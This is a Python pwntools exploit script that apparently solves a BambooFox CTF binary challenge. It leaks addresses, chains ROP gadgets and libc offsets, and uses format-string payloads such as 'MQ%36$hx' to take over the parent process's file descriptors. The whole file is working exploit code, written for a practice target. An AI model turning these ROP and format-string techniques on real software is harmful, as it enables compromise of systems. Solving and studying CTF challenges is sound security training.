#!/usr/bin/python3

from pwn import *
import sys
import subprocess
"""
I didn't solve the original problem, the solution is the version of no size limit.

This script only can use fmt to make parent read from stdin and write to stdout.
"""
elf_name = './R'
libc_name = './libc-2.29.so'
e = ELF(elf_name)
libc = ELF(libc_name)

context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote('chall.ctf.bamboofox.tw', 10100)
else:
    r = gdb.debug(elf_name, env={"LD_PRELOAD": libc_name}, gdbscript='''
    b *0x5555555553ed
    b *0x5555555555ad
    b *0x5555555558ce
    c
    ni
    c
    c
    ''')

if len(sys.argv) == 1:
    pid = r.recvline()[:-1].split(b' ')[-1].decode()
    child = gdb.attach(int(pid), gdbscript='''
    b *0x555555555a4e
    c
   ''')
r.recvuntil('Gift1: ')
mmap_addr = int(r.recvline()[:-1], 16)
r.recvuntil('Gift2: ')
code_base = int(r.recvline()[:-1], 16) - 0x138b
info(f"s: {hex(mmap_addr)}")
info(f"code: {hex(code_base)}")
info(f"lib_entries: {hex(mmap_addr + 0x800)}")

##### const #####
garbage_ptr = 0x4f00 + code_base
lib_ets = {
    'write': 0x9b0 + mmap_addr,
    'read': 0x9b8 + mmap_addr,
    'strtol': 0x9c0 + mmap_addr,
    'sprintf': 0x9c8 + mmap_addr,
}
printf_got = 0x4028 + code_base
mmap_got = 0x4020 + code_base
buf = mmap_addr

##### ROP hell #####
# add dword ptr [rcx - 0xd343], eax ; jmp rdi
add_magic = 0x18d9 + code_base

# mov dword ptr [rdx], eax ; mov eax, 1 ; pop rbp ; ret
movptr_magic = 0x1382 + code_base

# mov eax, dword ptr [rbp - 4]; mov dword ptr [rdx], eax; mov eax, 1; pop rbp; ret
mov_magic = 0x137f + code_base

pop_rax_ret = 0x1a4f + code_base
pop_rdx_ret = 0x1a53 + code_base
pop_rbp_ret = 0x122f + code_base
pop_rdi_ret = 0x1abb + code_base
pop_rcx_ret = 0x1a51 + code_base
pop_rsi_r15_ret = 0x1ab9 + code_base
jmp_rax = 0x11af + code_base
ret = 0x1016 + code_base

def move_value(f, t):
    ### 1~4 bytes ###
    rop = b''
    rop += p64(pop_rdx_ret) + p64(t)
    rop += p64(pop_rbp_ret) + p64(f+4)
    rop += p64(pop_rax_ret) + p64(0) # reset rax
    rop += p64(mov_magic) + p64(0) # 0 for pop rbp
    ### 5~8 bytes ###
    rop += p64(pop_rdx_ret) + p64(t+4)
    rop += p64(pop_rbp_ret) + p64(f+4+4)
    rop += p64(pop_rax_ret) + p64(0)
    rop += p64(mov_magic) + p64(0)
    return rop

def add_value(addr, val):
    rop = b''
    rop += p64(pop_rcx_ret) + p64(addr + 0xd343)
    rop += p64(pop_rax_ret) + p64(val)
    rop += p64(pop_rdi_ret) + p64(ret)
    rop += p64(add_magic)
    return rop

def _read(fd, buf, size):
    rop = b''
    rop += p64(pop_rdi_ret) + p64(fd)
    rop += p64(pop_rsi_r15_ret) + p64(buf) + p64(0)
    rop += p64(pop_rdx_ret) + p64(size)
    rop += b'\xAA'*8 # padding

    return rop

def _write(fd, buf, size):
    rop = b''
    rop += p64(pop_rdi_ret) + p64(fd)
    rop += p64(pop_rsi_r15_ret) + p64(buf) + p64(0)
    rop += p64(pop_rdx_ret) + p64(size)
    rop += b'\xAA'*8 # padding

    return rop

def _strtol(buf):
    rop = b''
    rop += p64(pop_rdi_ret) + p64(buf)
    rop += p64(pop_rsi_r15_ret) + p64(0) + p64(0)
    rop += p64(pop_rdx_ret) + p64(16)
    rop += b'\xAA'*8 # padding

    return rop

# prepare rdx done
def _sprintf(buf, fmt):
    rop = b''
    rop += p64(pop_rdi_ret) + p64(buf)
    rop += p64(pop_rsi_r15_ret) + p64(fmt) + p64(0)
    rop += b'\xAA'*8 # padding

    return rop

off_write_mmap = 0xffff5b90
off_read_mmap = 0xffff5af0
off_strtol_printf = 0xfffe6b10
off_sprintf_printf = 0x180
off_mov_rdx_rax_ret_printf = 0xd8fbf
off_sub_rax_rdx_ret_printf = 0xfffe53fd
"""
fd 3, 4, 5, 6 == 0x188, 0x184, 0x180, 0x17c
4: write ===> 1 stdout
5: read ===> 0 stdin

TARGET:
write(6, "MQ%36$hx", 0x10) # get stack address
read(3, buf, 0x6)
fd_addr = strtol(buf[2], 0, 16) - (0x184+2+1)
sprintf(buf, "MQ%%%dc%%36$hn", value);
write(6, "MQ%{fd_addr-2}c%36$hn", 0x18)
write(6, "MQ%254c%62$ln", 0x10)
"""

##### puts libc into specified address #####
rop1 = [
    # get write libc
    move_value(mmap_got, lib_ets['write']),
    add_value(lib_ets['write'], off_write_mmap),
    
    # get read libc
    move_value(mmap_got, lib_ets['read']),
    add_value(lib_ets['read'], off_read_mmap),
    
    # get strtol libc
    move_value(printf_got, lib_ets['strtol']),
    add_value(lib_ets['strtol'], off_strtol_printf),
    
    # get sprintf libc
    move_value(printf_got, lib_ets['sprintf']),
    add_value(lib_ets['sprintf'], off_sprintf_printf),
]
mrop = b''
mrop += move_value(lib_ets['write'], mmap_addr + 0x788) # write
mrop += move_value(lib_ets['read'], mmap_addr + 0x7c8) # read
mrop += move_value(lib_ets['strtol'], mmap_addr + 0x808) # strtol
mrop += move_value(lib_ets['sprintf'], mmap_addr + 0x860) # sprintf
mrop += move_value(printf_got, mmap_addr + 0x820) # sub rax, rdx ; ret
mrop += add_value(mmap_addr + 0x820, off_sub_rax_rdx_ret_printf)
mrop += move_value(printf_got, mmap_addr + 0x828) # mov rdx, rax ; ret
mrop += add_value(mmap_addr + 0x828, off_mov_rdx_rax_ret_printf)
mrop += move_value(lib_ets['write'], mmap_addr + 0x8a0) # write
mrop += move_value(lib_ets['write'], mmap_addr + 0x8e0) # write

##### do target #####
# write(6, "MQ%36$hx")
rop2_1 = _write(6, mmap_addr + 0x980, 0x10)
# read(3, buf, 0x6)
rop2_2 = _read(3, buf, 0x6)
# strtol(buf[2], 0, 16) - 0x184
rop2_3 = _strtol(buf+2)
# sprintf(buf, "MQ%%%dc%%36$hn", value);
## sub rax, rdx ; ret
## mov rax, rdx ; ret
rop2_4 = p64(pop_rdx_ret) + p64(0x184+2+1) + p64(0xBBBBBBBBBBBBBBBB) + p64(0xBBBBBBBBBBBBBBBB) + p64(ret) # for stack alignment
rop2_4 += _sprintf(buf, mmap_addr + 0x990)
# write(6, "MQ%{fd}c%36$hn")
rop2_5 = _write(6, buf, 0x18)
# write(6, "MQ%1c%65$ln")
rop2_6 = _write(6, mmap_addr + 0x9a0, 0x10)

rop2 = rop2_1 + rop2_2 + rop2_3 + rop2_4 + rop2_5 + rop2_6
frop = b''.join(rop1) + mrop + rop2
print(hex(len(frop)))
frop += ((0x980 - len(frop)) // 0x8)*p64(ret) # padding with ret
frop += b'MQ%36$hx'.ljust(0x10, b'\x00') # 0x980 ~ 0x990
frop += b'MQ%%%dc%%36$hn'.ljust(0x10, b'\x00') # 0x990 ~ 0x9a0
frop += b'MQ%254c%62$ln'.ljust(0x10, b'\x00') # 0x9a0 ~ 0x9b0
print(hex(len(frop)))
r.sendlineafter('Give me chain :', frop)
r.interactive()
